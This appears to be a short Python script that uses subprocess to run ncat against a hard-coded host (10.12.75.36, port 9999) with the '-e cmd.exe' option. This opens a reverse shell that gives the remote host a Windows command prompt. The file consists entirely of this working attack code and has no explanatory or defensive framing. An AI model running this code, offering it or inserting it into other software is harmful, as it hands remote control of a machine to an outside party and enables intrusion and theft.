import subprocess
client_ip= "10.12.75.36"
port = "9999"
subprocess.Popen(["ncat", client_ip, port, "-e","cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


